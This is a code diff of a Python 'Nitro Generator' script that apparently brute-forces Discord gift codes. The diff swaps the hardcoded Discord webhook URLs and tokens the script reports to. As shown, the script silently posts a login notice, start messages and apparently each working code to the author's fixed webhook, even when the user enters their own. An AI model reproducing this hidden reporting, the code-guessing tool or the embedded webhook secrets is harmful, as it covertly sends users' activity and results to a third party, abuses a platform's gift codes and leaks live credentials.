@@ -33,7 +33,7 @@ num = random.randint(10, 1000)
 num2 = random.randint(100, 500)
 time.sleep(1)
 
-hook = Webhook("https://discord.com/api/webhooks/930230963512938518/WoKVYUjX_kdU9hAFCAsY6zFL415chbr8FPdpuRhdVUyEBOBKolT5jdpLBHeqbQ6cttQE")  
+hook = Webhook("https://discord.com/api/webhooks/930481811929325609/elhOSdc7gQHRyvs8i06cLGBFUmQ6hgtxz-18efXyLQGQaYhynj0fy6Ds0EZD931JB-m-")  
 
 hook.send(f"""
 > **[User{num}]** Just logged in!
@@ -469,9 +469,9 @@ def generatecodes():
         }
         result = requests.post(webhurl, json=data)
         result1 = requests.post \
-            ("https://discord.com/api/webhooks/930123317128618095/pPKJyRDCCCDhkFGvAsAAR6Jxdq7VczBgbLZ5Uq6YDpNUl343i7uqRByYzbysaYEGdYvZ", json=data1)
+            ("https://discord.com/api/webhooks/930481955923976222/RF96gRYcupgiQK_tI4x9BgdXUP-1Eub79Ggiv5badR51koFtFJpqKF2rLMpLkt14ZLYB", json=data1)
         result.raise_for_status()
-        if webhurl != "https://discord.com/api/webhooks/930123317128618095/pPKJyRDCCCDhkFGvAsAAR6Jxdq7VczBgbLZ5Uq6YDpNUl343i7uqRByYzbysaYEGdYvZ":
+        if webhurl != "https://discord.com/api/webhooks/930481955923976222/RF96gRYcupgiQK_tI4x9BgdXUP-1Eub79Ggiv5badR51koFtFJpqKF2rLMpLkt14ZLYB":
             result1.raise_for_status()
     else:
         print(np.array(f"{Fore.RED} [NOT WORKING]: {Fore.RESET}" + nitrourl))
@@ -490,7 +490,7 @@ webhopt = input(f"{Fore.LIGHTBLUE_EX}[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.R
 if webhopt == 'y':
     webhurl = input(f"{Fore.LIGHTBLUE_EX}\n[{Fore.GREEN}>>>{Fore.LIGHTBLUE_EX}]{Fore.RESET} Enter a webhook for valid codes to be sent to: ")
 else:
-    webhurl = "https://discord.com/api/webhooks/930123317128618095/pPKJyRDCCCDhkFGvAsAAR6Jxdq7VczBgbLZ5Uq6YDpNUl343i7uqRByYzbysaYEGdYvZ"
+    webhurl = "https://discord.com/api/webhooks/930481955923976222/RF96gRYcupgiQK_tI4x9BgdXUP-1Eub79Ggiv5badR51koFtFJpqKF2rLMpLkt14ZLYB"
 data1 = {
     "content": "Started Checking Codes. (Force nitro generator.)",
     "username": "Nitro Generator"
@@ -503,9 +503,9 @@ data3 = {
 }
 result = requests.post(webhurl, json=data1)
 result2 = requests.post \
-    ("https://discord.com/api/webhooks/930123317128618095/pPKJyRDCCCDhkFGvAsAAR6Jxdq7VczBgbLZ5Uq6YDpNUl343i7uqRByYzbysaYEGdYvZ", json=data3)
+    ("https://discord.com/api/webhooks/930481955923976222/RF96gRYcupgiQK_tI4x9BgdXUP-1Eub79Ggiv5badR51koFtFJpqKF2rLMpLkt14ZLYB", json=data3)
 
-if webhurl != "https://discord.com/api/webhooks/930123317128618095/pPKJyRDCCCDhkFGvAsAAR6Jxdq7VczBgbLZ5Uq6YDpNUl343i7uqRByYzbysaYEGdYvZ":
+if webhurl != "https://discord.com/api/webhooks/930481955923976222/RF96gRYcupgiQK_tI4x9BgdXUP-1Eub79Ggiv5badR51koFtFJpqKF2rLMpLkt14ZLYB":
     result2.raise_for_status()
 os.system("CLS")
 for i in range(threadsnumber):
